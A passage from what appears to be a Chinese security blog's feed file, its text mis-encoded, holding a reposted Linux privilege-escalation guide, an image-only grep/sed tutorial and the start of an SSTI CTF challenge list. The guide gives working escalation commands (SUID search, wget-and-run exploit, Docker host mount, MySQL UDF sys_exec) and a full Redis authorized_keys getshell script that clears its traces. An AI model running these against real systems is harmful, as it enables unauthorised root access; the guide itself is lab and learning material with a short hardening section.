‡æœºå™¨ä¸Šç”¨<code>find / -perm -u=s -type f 2&gt;/dev/null</code> æ¥æŸ¥çœ‹å¯ä»¥suidææƒçš„æ–‡ä»¶ï¼Œå‘ç°ä¹‹å‰ç¼–è¯‘çš„shellå¯æ‰§è¡Œæ–‡ä»¶åœ¨é‡Œé¢ã€‚</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200620164258-0afb894a-b2d2-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200620164258-0afb894a-b2d2-1.png" alt="img"></a></p><p>æ›´å¤šçš„æ“ä½œå¯ä»¥å‚è€ƒï¼š<a href="https://xz.aliyun.com/t/2767">https://xz.aliyun.com/t/2767</a></p><h3 id="åˆ©ç”¨å­˜åœ¨æ¼æ´çš„å‘½ä»¤"><a href="#åˆ©ç”¨å­˜åœ¨æ¼æ´çš„å‘½ä»¤" class="headerlink" title="åˆ©ç”¨å­˜åœ¨æ¼æ´çš„å‘½ä»¤"></a>åˆ©ç”¨å­˜åœ¨æ¼æ´çš„å‘½ä»¤</h3><p>ä¸å¯å¦è®¤çš„æ˜¯å‘½ä»¤å¾ˆå¤šï¼Œæˆ‘ä»¬ä¸å¯èƒ½ç†Ÿæ‚‰æ¯ä¸€ç§å‘½ä»¤çš„æ¼æ´ã€‚ä¸è¿‡æˆ‘ä»¬æ¯æ¬¡é‡åˆ°äº†éƒ½å¯ä»¥ç”¨<code>searchsploit</code> æ¥å¯»æ‰¾å¯åˆ©ç”¨çš„expã€‚</p><p>è¿™é‡Œä»¥DC 5 é¶æœºä¸ºä¾‹ï¼š</p><p><code>ls -al</code> ï¼š</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200630103619-7a819cc8-ba7a-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200630103619-7a819cc8-ba7a-1.png" alt="img"></a></p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200630103619-7acd7cec-ba7a-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200630103619-7acd7cec-ba7a-1.png" alt="img"></a></p><p>å¯ä»¥é€šè¿‡cat è¯»å–ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶æ€ä¹ˆç”¨ã€‚</p><p>æ”»å‡»æœºå™¨å¼€å¯ä¸€ä¸ªhttp æœåŠ¡ï¼š</p><pre><code>python -m SimpleHTTPServer</code></pre><p>å°†exploit ç”¨ wget ä¸‹è½½åˆ°å¯æ‰§è¡Œçš„<code>/tmp/</code>ç›®å½•ä¸‹ã€‚ç„¶åæ‰§è¡Œ<code>sh</code> æ–‡ä»¶ã€‚æœ€ååœ¨<code>/etc/</code>ç›®å½•ä¸‹æ‰§è¡Œ<code>./rootshell</code> å³å¯get root shellã€‚</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200630103620-7afc19bc-ba7a-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200630103620-7afc19bc-ba7a-1.png" alt="img"></a></p><hr><p>è¿˜æœ‰ä¹‹å‰çˆ†çš„sudo ææƒï¼ŒCVE-2019-14187ã€‚åªä¸è¿‡æ¯”è¾ƒé¸¡è‚‹ã€‚</p><blockquote><p><strong>Sudo çš„å…¨ç§°æ˜¯â€œsuperuserdoâ€ï¼Œå®ƒæ˜¯Linuxç³»ç»Ÿç®¡ç†æŒ‡ä»¤ï¼Œå…è®¸ç”¨æˆ·åœ¨ä¸éœ€è¦åˆ‡æ¢ç¯å¢ƒçš„å‰æä¸‹ä»¥å…¶å®ƒç”¨æˆ·çš„æƒé™è¿è¡Œåº”ç”¨ç¨‹åºæˆ–å‘½ä»¤ã€‚é€šå¸¸ä»¥ root ç”¨æˆ·èº«ä»½è¿è¡Œå‘½ä»¤ï¼Œæ˜¯ä¸ºäº†å‡å°‘ root ç”¨æˆ·çš„ç™»å½•å’Œç®¡ç†æ—¶é—´ï¼ŒåŒæ—¶æé«˜å®‰å…¨æ€§ã€‚</strong></p></blockquote><p><strong>åˆ©ç”¨å‰æ</strong></p><ol><li>sudo -v &lt; 1.8.28</li><li>çŸ¥é“å½“å‰ç”¨æˆ·çš„å¯†ç </li><li>å½“å‰ç”¨æˆ·å­˜åœ¨äºsudoæƒé™åˆ—è¡¨</li></ol><p>å¤ç°å‚è€ƒï¼š<a href="https://www.cnblogs.com/ethtool/p/12176730.html">https://www.cnblogs.com/ethtool/p/12176730.html</a></p><h3 id="åˆ©ç”¨ç¬¬ä¸‰æ–¹æœåŠ¡ææƒ"><a href="#åˆ©ç”¨ç¬¬ä¸‰æ–¹æœåŠ¡ææƒ" class="headerlink" title="åˆ©ç”¨ç¬¬ä¸‰æ–¹æœåŠ¡ææƒ"></a>åˆ©ç”¨ç¬¬ä¸‰æ–¹æœåŠ¡ææƒ</h3><h4 id="Docker-ç»„ææƒ"><a href="#Docker-ç»„ææƒ" class="headerlink" title="Docker ç»„ææƒ"></a>Docker ç»„ææƒ</h4><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/qq_41918771/article/details/103666135">https://blog.csdn.net/qq_41918771/article/details/103666135</a></p><blockquote><p>docker ç»„å†…ç”¨æˆ·æ‰§è¡Œå‘½ä»¤çš„æ—¶å€™ä¼šè‡ªåŠ¨åœ¨æ‰€æœ‰å‘½ä»¤å‰æ·»åŠ  sudoã€‚å› ä¸ºè®¾è®¡æˆ–è€…å…¶ä»–çš„åŸå› ï¼ŒDocker  ç»™äºˆæ‰€æœ‰ docker ç»„çš„ç”¨æˆ·ç›¸å½“å¤§çš„æƒåŠ›ï¼ˆè™½ç„¶æƒåŠ›åªä½“ç°åœ¨èƒ½è®¿é—® /var/run/docker.sock ä¸Šé¢ï¼‰ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒDocker è½¯ä»¶åŒ…æ˜¯ä¼šé»˜è®¤æ·»åŠ ä¸€ä¸ª docker ç”¨æˆ·ç»„çš„ã€‚Docker å®ˆæŠ¤è¿›ç¨‹ä¼šå…è®¸ root ç”¨æˆ·å’Œ docker<br> ç»„ç”¨æˆ·è®¿é—® Dockerã€‚ç»™ç”¨æˆ·æä¾› Docker æƒé™å’Œç»™ç”¨æˆ·æ— éœ€è®¤è¯ä¾¿å¯ä»¥éšä¾¿è·å–çš„ root æƒé™å·®åˆ«ä¸å¤§ã€‚</p></blockquote><p>æ™®é€šç”¨æˆ·æ‰§è¡Œï¼šå³å¯è·å¾—rootæƒé™ã€‚</p><pre><code>docker run -v /:/hostOS -i -t chrisfosterelli/rootplease</code></pre><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200630103620-7b334f7c-ba7a-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200630103620-7b334f7c-ba7a-1.png" alt="img"></a></p><h4 id="MySQL-UDF-ææƒ"><a href="#MySQL-UDF-ææƒ" class="headerlink" title="MySQL UDF ææƒ"></a>MySQL UDF ææƒ</h4><p>ä¹‹å‰åœ¨åšJarivsOJ CTF é‡Œæœ‰ä¸€ä¸ªé¢˜ï¼Œé‡Œé¢å°±ç”¨äº†UDFï¼Œé‚£æ˜¯æˆ‘ç¬¬ä¸€æ¬¡é‡åˆ°è¿™ä¸ªä¸œè¥¿ã€‚</p><pre><code>show variables like &#39;%compile%&#39;;show variables like &#39;plugin%&#39;;</code></pre><p>ä¸è¿‡è¿™é‡Œæœ‰ä¸€ä¸ªé™åˆ¶ï¼Œ<code>show global variables like &#39;secure%&#39;</code> secure_file_priv æ²¡æœ‰å…·ä½“çš„å€¼ï¼ˆå³èƒ½å¤Ÿå¯¼å‡º/å†™å…¥æ–‡ä»¶</p><blockquote><p>å½“ secure_file_priv çš„å€¼ä¸º NULL ï¼Œè¡¨ç¤ºé™åˆ¶ mysqld ä¸å…è®¸å¯¼å…¥|å¯¼å‡ºï¼Œæ­¤æ—¶æ— æ³•ææƒ<br> å½“ secure_file_priv çš„å€¼ä¸º /tmp/ ï¼Œè¡¨ç¤ºé™åˆ¶ mysqld çš„å¯¼å…¥|å¯¼å‡ºåªèƒ½å‘ç”Ÿåœ¨ /tmp/ ç›®å½•ä¸‹ï¼Œæ­¤æ—¶ä¹Ÿæ— æ³•ææƒ<br> å½“ secure_file_priv çš„å€¼æ²¡æœ‰å…·ä½“å€¼æ—¶ï¼Œè¡¨ç¤ºä¸å¯¹ mysqld çš„å¯¼å…¥|å¯¼å‡ºåšé™åˆ¶ï¼Œæ­¤æ—¶å¯ææƒ</p></blockquote><p>MSF ä¸­çš„ <code>exploit/multi/mysql/mysql_udf_payload</code> æ¼æ´åˆ©ç”¨æ¨¡å—å¯ä»¥è¿›è¡ŒUDFææƒ</p><p>ä½¿ç”¨ <code>select sys_exec(&#39;whoami&#39;);</code> æˆ– <code>select sys_eval(&#39;whoami&#39;);</code> æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p><h4 id="Redis-æ‰¹é‡getshell"><a href="#Redis-æ‰¹é‡getshell" class="headerlink" title="Redis æ‰¹é‡getshell"></a>Redis æ‰¹é‡getshell</h4><blockquote><p>å¦‚æœRedisä»¥rootèº«ä»½è¿è¡Œï¼Œé»‘å®¢å¯ä»¥åˆ©ç”¨Rediså†™å…¥SSHå…¬é’¥æ–‡ä»¶ï¼Œç›´æ¥é€šè¿‡SSHå…å¯†ç ç™»å½•å—å®³æœåŠ¡å™¨ã€‚Redis é»˜è®¤ç»‘å®šåœ¨6379ç«¯å£ï¼Œå¹¶ä¸”æ²¡æœ‰å¼€å¯è®¤è¯ï¼Œåœ¨æ²¡æœ‰ä»»ä½•è®¿é—®ç­–ç•¥çš„æƒ…å†µä¸‹ï¼Œä»»ä½•äººå¯ä»¥ç›´æ¥åœ¨éæˆæƒæƒ…å†µä¸‹ç›´æ¥è®¿é—®RedisæœåŠ¡å¹¶è¿›è¡Œç›¸å…³æ“ä½œã€‚</p></blockquote><p>ç›¸å…³åˆ©ç”¨expï¼š<a href="https://github.com/Xyntax/POC-T/blob/9d538a217cb480dbd1f94f1fa6c8154a41b5b106/script/redis-sshkey-getshell.py">https://github.com/Xyntax/POC-T/blob/9d538a217cb480dbd1f94f1fa6c8154a41b5b106/script/redis-sshkey-getshell.py</a></p><pre><code>#!/usr/bin/env python# -*- coding: utf-8 -*-# project = https://github.com/Xyntax/POC-T# author = i@cdxy.me&quot;&quot;&quot;redis getshell expliot (ssh authorized_keys)&quot;&quot;&quot;import redisimport paramikofrom plugin.util import host2IPfrom plugin.util import randomStringfrom plugin.util import checkPortTcpfrom paramiko.ssh_exception import SSHExceptionpublic_key = &#39;ssh-rsa =====&#39;private_key = &quot;&quot;&quot;-----BEGIN RSA PRIVATE KEY-----=====-----END RSA PRIVATE KEY-----&quot;&quot;&quot;import timedef poc(url):    url = host2IP(url)    ip = url.split(&#39;:&#39;)[0]    port = int(url.split(&#39;:&#39;)[-1]) if &#39;:&#39; in url else 6379    try:        if not checkPortTcp(ip, 22):            return False        r = redis.Redis(host=ip, port=port, db=0)        if &#39;redis_version&#39; in r.info():            key = randomString(10)            r.set(key, &#39;\n\n&#39; + public_key + &#39;\n\n&#39;)            r.config_set(&#39;dir&#39;, &#39;/root/.ssh&#39;)            r.config_set(&#39;dbfilename&#39;, &#39;authorized_keys&#39;)            r.save()            r.delete(key)  # æ¸…é™¤ç—•è¿¹            r.config_set(&#39;dir&#39;, &#39;/tmp&#39;)            time.sleep(5)            if testConnect(ip, 22):                return True    except Exception:        return False    return Falsedef testConnect(ip, port=22):    try:        s = paramiko.SSHClient()        s.load_system_host_keys()        s.connect(ip, port, username=&#39;root&#39;, pkey=private_key, timeout=10)        s.close()        return True    except Exception, e:        if type(e) == SSHException:            return True        return False</code></pre><p>å…¶ä»–â€¦â€¦</p><blockquote><p>ä¸€èˆ¬æƒ…å†µæƒ…å†µä¸‹ï¼Œå†…æ ¸æ¼æ´æˆ–è€…ç¬¬ä¸‰æ–¹æœåŠ¡æ¥ææƒçš„æƒ…å†µæ›´å¤šã€‚</p></blockquote><h1 id="å¦‚ä½•é˜²æ­¢è¢«ææƒ"><a href="#å¦‚ä½•é˜²æ­¢è¢«ææƒ" class="headerlink" title="å¦‚ä½•é˜²æ­¢è¢«ææƒ"></a>å¦‚ä½•é˜²æ­¢è¢«ææƒ</h1><ul><li>ç³»ç»Ÿç®¡ç†å‘˜è¦å®‰å…¨ï¼Œå‡†ç¡®çš„é…ç½®SUIDæ‰§è¡Œæ–‡ä»¶ã€‚</li><li>ä¸€äº›æ²¡å¿…è¦ä»¥é«˜æƒé™ç”¨æˆ·æ‰§è¡Œçš„æ–‡ä»¶ï¼Œåº”è¯¥å–æ¶ˆæƒé™ã€‚</li><li>è§„é¿ä½¿ç”¨æ— å¯†ç root æ‰§è¡Œå‘½ä»¤ï¼Œè„šæœ¬ç­‰ã€‚</li><li>ä¿®å¤/å‡çº§å­˜åœ¨å·²çŸ¥æ¼æ´çš„ç»„ä»¶ï¼Œå‡çº§æ“ä½œç³»ç»Ÿç‰ˆæœ¬æœ€æ–°ç‰ˆã€‚</li><li>Linux 2.2 ä¹‹åå¯ä»¥ä¸ºå‘½ä»¤å¢åŠ  capabilities, ä»¥p å¸ˆå‚…åšå®¢é‡Œçš„ç»™nmapå¢åŠ è¯¥å±æ€§ä¸ºä¾‹ã€‚</li><li>å‡çº§ç¬¬ä¸‰æ–¹æœåŠ¡ï¼Œä¿®å¤å·²çŸ¥æ¼æ´</li></ul><pre><code>sudo setcap cap_net_raw,cap_net_admin,cap_net_bind_service+eip /usr/bin/nmapnmap --privileged -sS 192.168.1.1</code></pre><p><a href="https://man7.org/linux/man-pages/man7/capabilities.7.html">https://man7.org/linux/man-pages/man7/capabilities.7.html</a></p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>é€šè¿‡æœ¬æ¬¡å­¦ä¹ ï¼Œè„‘æµ·é‡Œæœ‰äº†ä¸€ä¸ªå¤§æ¦‚çš„æ€è·¯ï¼Œä»¥åé‡åˆ°äº†ä¹Ÿä¸ä¼šè¿·æƒ˜ã€‚ä½†æ˜¯æˆ‘æ—è¾¹å¸ˆå‚…ç»™æˆ‘è¯´ï¼Œé¶æœºçš„ææƒæœ‰äº›åœ¨å®é™…ä¸­æ ¹æœ¬ç”¨ä¸åˆ°ã€‚æ‰€ä»¥ï¼Œè¿˜æ˜¯è¦çµæ´»å¤„ç†ï¼Œæ ¸å¿ƒæ€è·¯åº”è¯¥æ˜¯ä¸å˜çš„å§ï¼</p><p>æ³¨:æœ¬ç¯‡æ–‡ç« è½¬è‡ªå…ˆçŸ¥ç¤¾åŒº ï¼š <a href="https://xz.aliyun.com/t/7924#toc-0">https://xz.aliyun.com/t/7924#toc-0</a></p>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨ </category>
          
          <category> Linuxææƒ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ææƒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux shell è„šæœ¬ç¼–ç¨‹</title>
      <link href="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/"/>
      <url>/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="æ–‡æœ¬ä¸‰å‰‘å®¢ä¹‹GREPä¸æ­£åˆ™è¡¨è¾¾å¼å…¥é—¨"><a href="#æ–‡æœ¬ä¸‰å‰‘å®¢ä¹‹GREPä¸æ­£åˆ™è¡¨è¾¾å¼å…¥é—¨" class="headerlink" title="æ–‡æœ¬ä¸‰å‰‘å®¢ä¹‹GREPä¸æ­£åˆ™è¡¨è¾¾å¼å…¥é—¨"></a>æ–‡æœ¬ä¸‰å‰‘å®¢ä¹‹GREPä¸æ­£åˆ™è¡¨è¾¾å¼å…¥é—¨</h1><h2 id="grepå‘½ä»¤è¯¦è§£"><a href="#grepå‘½ä»¤è¯¦è§£" class="headerlink" title="grepå‘½ä»¤è¯¦è§£"></a>grepå‘½ä»¤è¯¦è§£</h2><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220309163744532.png" alt="image-20220309163744532"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220309164006965.png" alt="image-20220309164006965"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220309164124381.png" alt="image-20220309164124381"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220309164153116.png" alt="image-20220309164153116"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220309164202884.png" alt="image-20220309164202884"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220309164216276.png" alt="image-20220309164216276"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220309170755365.png" alt="image-20220309170755365"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220309171250634.png" alt="image-20220309171250634"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220309171452021.png" alt="image-20220309171452021"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220309171750029.png" alt="image-20220309171750029"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220309172440403.png" alt="image-20220309172440403"></p><h2 id="æ­£åˆ™è¡¨è¾¾å¼å…¥é—¨"><a href="#æ­£åˆ™è¡¨è¾¾å¼å…¥é—¨" class="headerlink" title="æ­£åˆ™è¡¨è¾¾å¼å…¥é—¨"></a>æ­£åˆ™è¡¨è¾¾å¼å…¥é—¨</h2><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220309172719330.png" alt="image-20220309172719330"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220309172932180.png" alt="image-20220309172932180"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220309173155868.png" alt="image-20220309173155868"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220310221059335.png" alt="image-20220310221059335"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220310222034558.png" alt="image-20220310222034558"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220310222048846.png" alt="image-20220310222048846"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220310222156870.png" alt="image-20220310222156870"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220310222253774.png" alt="image-20220310222253774"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220310222536062.png" alt="image-20220310222536062"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220310222947293.png" alt="image-20220310222947293"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220310223442895.png" alt="image-20220310223442895"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220310223457982.png" alt="image-20220310223457982"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220310223913660.png" alt="image-20220310223913660"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220310224006972.png" alt="image-20220310224006972"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220310224106984.png" alt="image-20220310224106984"></p><h1 id="æ–‡æœ¬ä¸‰å‰‘å®¢ä¹‹SED"><a href="#æ–‡æœ¬ä¸‰å‰‘å®¢ä¹‹SED" class="headerlink" title="æ–‡æœ¬ä¸‰å‰‘å®¢ä¹‹SED"></a>æ–‡æœ¬ä¸‰å‰‘å®¢ä¹‹SED</h1><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312130438065.png" alt="image-20220312130438065"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312130454053.png" alt="image-20220312130454053"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312130622253.png" alt="image-20220312130622253"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312130857679.png" alt="image-20220312130857679"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312131800126.png" alt="image-20220312131800126"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312133718235.png" alt="image-20220312133718235"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312133753073.png" alt="image-20220312133753073"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312134452403.png" alt="image-20220312134452403"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312134809587.png" alt="image-20220312134809587"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312135021450.png" alt="image-20220312135021450"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312135508073.png" alt="image-20220312135508073"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312140156678.png" alt="image-20220312140156678"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312142630097.png" alt="image-20220312142630097"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312144358895.png" alt="image-20220312144358895"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312144428998.png" alt="image-20220312144428998"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312144844748.png" alt="image-20220312144844748"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312144908004.png" alt="image-20220312144908004"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312150114829.png" alt="image-20220312150114829"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312150551903.png" alt="image-20220312150551903"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312151045339.png" alt="image-20220312151045339"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312151057114.png" alt="image-20220312151057114"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312151618086.png" alt="image-20220312151618086"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312152110539.png" alt="image-20220312152110539"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312152259202.png" alt="image-20220312152259202"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312152359688.png" alt="image-20220312152359688"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312152440203.png" alt="image-20220312152440203"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312152528896.png" alt="image-20220312152528896"></p><p><strong>å°tips</strong></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312152552359.png" alt="image-20220312152552359"></p><p><strong>æ‰“å°åŒ¹é…å­—ç¬¦ä¸²çš„ä¸‹ä¸€è¡Œ</strong></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312152731016.png" alt="image-20220312152731016"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312152914192.png" alt="image-20220312152914192"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUU-æ¨¡æ¿æ³¨å…¥ä¸“é¡¹åˆ·é¢˜</title>
      <link href="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/"/>
      <url>/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="SSTIï¼š"><a href="#SSTIï¼š" class="headerlink" title="SSTIï¼š"></a>SSTIï¼š</h2><h2 id="ç›®å½•"><a href="#ç›®å½•" class="headerlink" title="ç›®å½•"></a>ç›®å½•</h2><h3 id="ç®€å•"><a href="#ç®€å•" class="headerlink" title="ç®€å•"></a>ç®€å•</h3><ul><li>  <del>[CSCCTF 2019 Qual]FlaskLight</del></li></ul><h3 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h3><ul><li>  <del>[BJDCTF2020]Cookie is so stable twigæ¨¡æ¿æ³¨å…¥</del></li><li>  <del>[WesternCTF2018]shrine æƒ³æ–¹è®¾æ³•è·å–config</del></li><li>  <del>[CISCN2019 åä¸œå—èµ›åŒº]Web11 smartyæ¨¡æ¿æ³¨å…¥</del></li><li>  <del>[BJDCTF2020]The mystery of ip</del></li><li>  <del>[GYCTF2020]FlaskApp debugæ¨¡å¼ä¸€å®šæ¡ä»¶ä¸‹å¯ä»¥çªƒå–å‡ºæ¥pinç å‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯é¢˜ç›®è¿‡æ»¤çš„ä¸å¤Ÿä¸¥æ ¼å¯¼è‡´å¯ä»¥ç›´æ¥æ‰“ï¼Œæ¯”ç­¾åˆ°éš¾ä¸€ç‚¹</del></li><li>  <del>[pasecactf_2019]flask_ssti ç¼–ç ç»•è¿‡</del></li><li>  <del>[GWCTF 2019]ä½ çš„åå­—</del></li><li>  <del>[CISCN2019 æ€»å†³èµ› Day1 Web3]Flask Message Board</del></li></ul><h3 id="ä¸­ç­‰"><a href="#ä¸­ç­‰" class="headerlink" title="ä¸­ç­‰"></a>ä¸­ç­‰</h3><ul><li>  <del>[æŠ¤ç½‘æ¯ 2018]easy_tornado å› ä¸ºæ¡†æ¶æ¯”è¾ƒå†·é—¨ï¼Œå¦‚æœä¸çœ‹WPçš„è¯éœ€è¦è‡ªå·±æ‰‹åŠ¨ç¿»æ‰‹å†Œï¼Œæˆ‘è§‰å¾—ç®—ä¸­ä¸Šåéš¾çš„é¢˜ç›®ã€‚</del></li><li>  <del>[CISCN2019 åä¸œå—èµ›åŒº]Double Secret å›½èµ›åŠå†³èµ›å› ä¸ºå¤§å®¶äº’ç›¸å‡ºé¢˜æ‰€ä»¥éƒ½äº’ç›¸æ¶å¿ƒï¼Œè¿™é¢˜æ•´ä¸ªMD4ï¼Œçº¿ä¸‹ç¯å¢ƒæ€ä¹ˆæ‰“ï¼Ÿ</del></li></ul><h3 id="å›°éš¾"><a href="#å›°éš¾" class="headerlink" title="å›°éš¾"></a>å›°éš¾</h3><ul><li>  [QWB2021 Quals]æ‰˜çº³å¤š</li></ul><h3 id="è„‘æ´"><a href="#è„‘æ´" class="headerlink" title="è„‘æ´"></a>è„‘æ´</h3><ul><li>  <del>[RootersCTF2019]I_&lt;3_Flask ç”¨nameæ³¨å…¥ã€‚ï¼Ÿæ€ä¹ˆæƒ³åˆ°çš„</del></li></ul><h2 id="Writeup"><a href="#Writeup" 